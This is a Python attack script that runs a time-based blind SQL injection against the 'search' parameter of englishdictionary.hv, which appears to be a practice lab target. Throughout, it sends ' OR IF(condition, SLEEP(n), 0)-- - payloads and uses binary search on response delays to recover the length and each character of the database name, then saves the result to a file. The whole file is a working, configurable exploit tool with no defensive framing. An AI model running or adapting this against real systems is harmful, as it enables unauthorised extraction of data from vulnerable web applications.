#!/usr/bin/env python3
"""
extract_db_name_or_style.py
Time-based blind SQLi extractor for englishdictionary.hv using the working "OR"- payload form:
    '?search=' OR IF(condition, SLEEP(SLEEP_TIME), 0)-- -

Usage:
  python3 extract_db_name_or_style.py

Config at top (BASE_URL, SLEEP_TIME, etc).
"""

import requests, time, sys

# ------------- CONFIG -------------
BASE_URL = "http://englishdictionary.hv/"   # include trailing slash
PARAM_NAME = "search"
SLEEP_TIME = 6                    # server-side sleep when condition true
TIMEOUT = SLEEP_TIME + 4
THRESHOLD = SLEEP_TIME - 1.5      # elapsed > THRESHOLD => condition likely true
MAX_DBNAME_LEN = 64
DELAY_BETWEEN_REQS = 0.12
HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64)",
    "Accept": "text/html,application/xhtml+xml",
    "Connection": "keep-alive",
}
PROXIES = None   # e.g. {'http':'http://127.0.0.1:8080'} to route through Burp
# ------------- END CONFIG -------------

session = requests.Session()
session.headers.update(HEADERS)
if PROXIES:
    session.proxies.update(PROXIES)

def send_payload(condition):
    """Send payload using the working OR style. condition is a SQL boolean expression string."""
    # Use the shorter OR SLEEP form when testing simple conditions; use IF(...) when comparing values
    payload = f"' OR IF({condition}, SLEEP({SLEEP_TIME}), 0)-- -"
    params = {PARAM_NAME: payload}
    try:
        t0 = time.time()
        r = session.get(BASE_URL, params=params, timeout=TIMEOUT)
        elapsed = time.time() - t0
        return elapsed, r
    except requests.exceptions.ReadTimeout:
        return TIMEOUT, None
    except requests.exceptions.RequestException as e:
        print(f"[!] Request error: {e}", file=sys.stderr)
        return 0.0, None

def test_length_eq(n):
    cond = f"LENGTH(database()) = {n}"
    elapsed, _ = send_payload(cond)
    return elapsed > THRESHOLD, elapsed

def test_cond(cond):
    elapsed, _ = send_payload(cond)
    return elapsed > THRESHOLD, elapsed

def find_length_binary(max_len=MAX_DBNAME_LEN):
    lo, hi = 0, max_len
    print(f"[*] Binary search for LENGTH(database()) in [0, {max_len}]")
    while lo < hi:
        mid = (lo + hi) // 2
        cond = f"LENGTH(database()) > {mid}"
        true, elapsed = test_cond(cond)
        print(f"  test LENGTH > {mid:2d} -> elapsed {elapsed:.2f}s -> {'TRUE' if true else 'FALSE'}")
        if true:
            lo = mid + 1
        else:
            hi = mid
        time.sleep(DELAY_BETWEEN_REQS)
    print(f"[+] Determined LENGTH(database()) = {lo}")
    return lo

def extract_name(length):
    print(f"[*] Extracting database() name of length {length}")
    name = ""
    for pos in range(1, length + 1):
        lo, hi = 32, 126   # printable ASCII
        found = None
        while lo <= hi:
            mid = (lo + hi) // 2
            cond = f"ASCII(SUBSTRING(database(),{pos},1)) > {mid}"
            true, elapsed = test_cond(cond)
            # debug print:
            print(f"    pos {pos} test >{mid:3d} -> {elapsed:.2f}s -> {'T' if true else 'F'}", end="\r")
            if true:
                lo = mid + 1
            else:
                # check equality to confirm the exact value (speeds up detection)
                eq_cond = f"ASCII(SUBSTRING(database(),{pos},1)) = {mid}"
                eq_true, _ = test_cond(eq_cond)
                if eq_true:
                    found = mid
                    print(f"    pos {pos}: found '{chr(mid)}' (ASCII {mid}){' ' * 20}")
                    name += chr(mid)
                    break
                else:
                    hi = mid - 1
            time.sleep(DELAY_BETWEEN_REQS)
        if found is None:
            print(f"    pos {pos}: failed -> inserting '?'")
            name += "?"
    return name

def main():
    print("[*] Starting extraction using OR-style payloads")
    # quick double-check: baseline sanity (should be TRUE)
    ok, elapsed = test_cond("1=1")
    print(f"[*] baseline (1=1) -> elapsed {elapsed:.2f}s -> {'TRUE' if ok else 'FALSE'}")
    if not ok:
        print("[!] Baseline did not delay. Re-check payload format or try a larger SLEEP_TIME.")
        return

    # find length
    length = find_length_binary()
    if length == 0:
        print("[!] Length reported 0. If you expect a non-zero database name, try increasing MAX_DBNAME_LEN or manually test equality for specific lengths.")
        return

    # extract name
    dbname = extract_name(length)
    print("\n[RESULT] database() = " + dbname)

    # save
    with open("extracted_dbname.txt", "w") as f:
        f.write(dbname)
    print("[*] Saved to extracted_dbname.txt")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
